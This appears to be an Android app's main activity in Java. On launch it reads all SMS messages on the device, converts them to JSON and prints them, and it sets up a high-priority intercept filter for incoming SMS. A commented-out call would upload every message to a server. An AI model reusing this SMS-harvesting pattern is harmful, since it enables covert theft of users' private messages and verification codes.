package com.zjp.zonlytools;

import java.util.List;

import com.zjp.zonlytools.config.ServiceParams;
import com.zjp.zonlytools.config.SystemConfig;
import com.zjp.zonlytools.entity.SmsInfo;
import com.zjp.zonlytools.entity.SoftInfo;
import com.zjp.zonlytools.sms.utils.SmsUtils;

import android.content.IntentFilter;
import android.os.Bundle;
import android.widget.TextView;
import zp.android.baseapp.base.BaseActivity;
import zp.android.baseapp.net.ResponseBody;
import zp.android.baseapp.net.XRequestCallBack;
import zp.baseandroid.common.utils.JsonUtils;

public class MainActivity extends BaseActivity {
	private TextView content;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		content=(TextView) findViewById(R.id.content);
		IntentFilter intentFilter = new IntentFilter();
		intentFilter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);
		intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
//		System.out.println();
		List<SmsInfo> smsInfos=SmsUtils.getSmsInfos(this);
		String smsJson=JsonUtils.getJson(smsInfos);
		System.out.println(smsJson);
//		sendRequest(ServiceParams.UPLOAD_ALL_SMS, SystemConfig.createUploadSmsParamMap(this, smsJson), new XRequestCallBack() {
//			@Override
//			public void onSuccess(ResponseBody responseBody) {
//				super.onSuccess(responseBody);
//				showToast(responseBody.toString());
//				
//			}
//			@Override
//			public void onFailure(String netErrorMsg) {
//				super.onFailure(netErrorMsg);
//				showToast(netErrorMsg);
//			}
//		});
		sendRequest(ServiceParams.VERSION_CHECK, SystemConfig.createUploadSmsParamMap(this, ""), new XRequestCallBack<List<SoftInfo>>() {
			@Override
			public void onSuccess(ResponseBody<List<SoftInfo>> responseBody) {
				super.onSuccess(responseBody);
				String softinfo=responseBody.getDataList().get(0).toString();
				System.out.println(softinfo);
				showToast(softinfo);
				
			}
			@Override
			public void onFailure(String netErrorMsg) {
				super.onFailure(netErrorMsg);
				showToast(netErrorMsg);
			}
		});
	}
	@Override
	protected void onDestroy() {
		super.onDestroy();
		System.out.println("MainActivity.onDestroy()");
	}
}
